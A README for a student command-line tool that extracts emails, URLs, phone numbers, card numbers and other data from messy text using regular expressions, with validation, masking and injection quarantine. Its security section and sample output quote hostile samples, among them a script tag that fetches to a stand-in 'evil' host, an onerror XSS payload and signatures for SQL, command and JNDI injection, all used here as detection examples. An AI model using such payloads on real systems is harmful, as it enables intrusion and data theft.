# ALU Regex Data Extraction

A small command line tool that reads messy unstructured text (support tickets,
chat logs, scraped HTML, invoices) and pulls eight kinds of structured data out
of it using regular expressions.

The thing I kept coming back to while building this is that a regex only tells
you a string *looks* right. It doesn't tell you it is right, and it definitely
doesn't tell you it's safe. So every match goes through a security check, then
a validator, then a masking step before it ends up in the output.

## What it extracts

| # | Type | Examples |
|---|------|----------|
| 1 | Email addresses | `user@example.com`, `first.last+tag@sub.domain.example.co.uk` |
| 2 | URLs | `https://example.com`, `http://host.example.net:8080/path?q=1#frag` |
| 3 | Phone numbers | `(555) 123-4567`, `555-123-4567`, `555.246.8100`, `+250 788 123 456` |
| 4 | Credit card numbers | `4111 1111 1111 1111`, `5500-0000-0000-0004`, Amex `3782 822463 10005` |
| 5 | Times | `14:30`, `23:59:59`, `2:30 PM`, `7:30 a.m.` |
| 6 | HTML tags | `<p>`, `<div class="x">`, `</span>`, `<img src="..." />`, `<br>` |
| 7 | Hashtags | `#DataEngineering`, `#alu_regex`, `#100DaysOfCode` |
| 8 | Currency amounts | `$1,299.00`, `EUR 25,00`, `150,000 RWF`, `£2,450.75`, `¥12,000` |

## Running it

```bash
git clone https://github.com/63DON/alu-regex-data-extraction_63DON.git
cd alu-regex-data-extraction_63DON

python3 src/main.py
```

With no arguments it reads `input/raw-text.txt` and writes
`output/sample-output.json`. You can point it somewhere else:

```bash
python3 src/main.py -i path/to/text.txt -o path/to/result.json
python3 src/main.py --no-mask     # emails and phones in full, cards stay masked
```

Tests:

```bash
cd src && python3 test_main.py
```

Python 3.9 or newer. No packages to install.

## Layout

```
alu-regex-data-extraction_63DON/
├── input/
│   └── raw-text.txt          sample messy text, including bad and hostile input
├── src/
│   ├── main.py               patterns, validators, masking, CLI
│   └── test_main.py          28 tests
├── output/
│   └── sample-output.json    the generated report
└── README.md
```

## How a match is handled

```
raw text
  -> size and line length check
  -> regex match
  -> injection check (on the match, and on the line it came from)
  -> validator (Luhn, TLD, digit count, allowed scheme, length)
  -> de-duplication
  -> masking
```

## Notes on the patterns

All eight live in the `PATTERNS` dict in `src/main.py` with comments on each
one. The decisions worth explaining:

**Email.** The TLD has to be alphabetic (`[A-Za-z]{2,24}`), which is what
rejects `user@localhost`. There's a lookbehind so the pattern can't start in
the middle of a word, and the local part is capped at 64 characters like the
RFC says.

**URL.** The scheme is limited to `http`/`https` in the regex and checked again
in the validator. Doing it twice is on purpose, since `javascript:`, `data:`
and `file:` are exactly how "we extracted a link" turns into a security
problem. Trailing sentence punctuation gets stripped, so
`See https://example.com/docs.` gives the URL without the full stop.

**Phone.** Three separate alternatives rather than one loose pattern. My first
attempt used a loose one and it cheerfully found a phone number inside
`1234567890123456789`.

**Credit card.** The regex only matches the shape. Whether the number is real
is decided by the Luhn checksum, which is why `1234 5678 9012 3456` gets
rejected and `4111 1111 1111 1111` doesn't, and it also lets the tool report
the issuer from the leading digits.

**Time.** The valid ranges are baked into the pattern
(`(?:[01]\d|2[0-3]):[0-5]\d`), so `25:99` and `19:61` never match in the first
place instead of being filtered out afterwards.

**Hashtag.** Must start with a letter or underscore, plus lookaheads that skip
hex colours. That keeps `#ffffff` and `#12345` out, which are the two false
positives a simple hashtag regex always produces.

**Currency.** Covers symbol first (`$1,299.00`), code first (`USD 3,500.50`)
and code last (`150,000 RWF`), and both the `1,299.00` and European `25,00`
decimal styles.

## Security

**Injection payloads get quarantined instead of extracted.** Twelve signature
groups cover XSS (`<script>`, `<iframe>`, `onerror=`, `javascript:`, `data:`
URIs), SQL injection (tautologies, `UNION SELECT`, `DROP TABLE`, comment
terminators), command injection (backticks, `$(...)`, `| sh`), template
injection (`{{...}}`, `${jndi:...}`), path traversal and null bytes.

**Context counts, not just the match.** `https://evil.example.com/steal` is a
perfectly valid URL on its own, but inside
`<script>fetch('https://evil.example.com/steal')</script>` it gets refused with
the reason `injection_context:xss_script_tag`. Clean data in a hostile line is
still hostile data.

**Sensitive values never leave in the clear.** Card numbers are masked to
`**** **** **** 1111` before they are stored, so the full number is never
written to the JSON and never sits in the result object. Emails and phones are
masked by default and you have to pass `--no-mask` to see them.

**No catastrophic backtracking.** Every quantifier is bounded (`{0,300}` rather
than `*` on a nested group), input is capped at 2 MB, lines are truncated at
5,000 characters and each type stops after 500 matches. There's a test that
feeds `"a"*5000 + "@" + "b"*5000` through every pattern to prove none of them
hang.

**Nothing dynamic.** All the patterns are module level constants. User input is
never compiled into a regex and never handed to `eval`, `exec` or a shell.

**Rejections are visible.** Everything thrown out shows up in the `rejected`
array with a reason (`failed_luhn_checksum`, `scheme_not_allowed`,
`consecutive_dots`, `injection:xss_event_handler` and so on). Silently dropping
bad data is how bugs stay hidden.

## Sample output

Cut down from `output/sample-output.json`:

```json
{
  "metadata": {
    "source_file": "raw-text.txt",
    "masking_enabled": true,
    "total_valid_matches": 60,
    "total_rejected": 13
  },
  "counts": {
    "email_addresses": 7,
    "urls": 6,
    "phone_numbers": 5,
    "credit_card_numbers": 3,
    "times": 10,
    "html_tags": 14,
    "hashtags": 8,
    "currency_amounts": 7
  },
  "data": {
    "email_addresses": ["a*********e@alueducation.com", "b*****g@example.com"],
    "urls": ["https://shop.example.com/account/billing?plan=pro&ref=email"],
    "credit_card_numbers": [
      { "masked": "**** **** **** 1111", "brand": "Visa", "length": 16, "luhn_valid": true }
    ],
    "hashtags": ["#urgent", "#Payments2026", "#alu_regex"]
  },
  "rejected": [
    { "type": "credit_card_numbers", "value": "1234 5678 9012 3456", "reason": "failed_luhn_checksum" },
    { "type": "urls", "value": "https://evil.example.com/steal?c=", "reason": "injection_context:xss_script_tag" },
    { "type": "html_tags", "value": "<img src=x onerror=\"alert('xss')\">", "reason": "injection:xss_event_handler" }
  ]
}
```

## Edge cases

| Input | What happens |
|---|---|
| `user@localhost` | rejected, no public TLD |
| `double..dots@example.com` | rejected, consecutive dots |
| `ftp://files.example.com/dump.zip` | rejected, scheme not allowed |
| `https://user:pass@example.com` | rejected, credentials in the URL |
| `See https://example.com/docs.` | full stop stripped |
| `1234 5678 9012 3456` | rejected, fails Luhn |
| `4111-1111-1111` | rejected, wrong length |
| `25:99`, `19:61`, `7:60 PM` | never matched |
| `#ffffff`, `#12345` | not treated as hashtags |
| `<!-- retry window 15:00 -->` | HTML comment, not flagged as SQL |
| `+250 788 123 456` and `+250-788-123-456` | de-duplicated to one |
| `1234567890123456789` | not a phone number |

## Tests

`src/test_main.py` has 28 tests across eight classes, one per data type plus a
`TestSecurity` class for the XSS and SQL signatures, context aware rejection,
the HTML comment false positive, card masking and backtracking.

```
$ cd src && python3 test_main.py
...
Ran 28 tests in 0.005s

OK
```

## Requirements checklist

| Requirement | Where |
|---|---|
| At least four data types | Eight, see the table at the top |
| Regexes identify each type correctly | `PATTERNS` in `src/main.py`, commented per type |
| Real world variations | `input/raw-text.txt` sections 1 to 4 |
| Edge cases | `input/raw-text.txt` section 5 and the table above |
| Malicious input rejected | `input/raw-text.txt` section 6, plus `INJECTION_SIGNATURES` |
| Sensitive data protected | Cards masked before storage, emails and phones masked by default |
| Code clarity and documentation | Comments on every pattern, this README, 28 tests |

## Author

63DON, ALU Regex Data Extraction assignment.
<https://github.com/63DON/alu-regex-data-extraction_63DON>
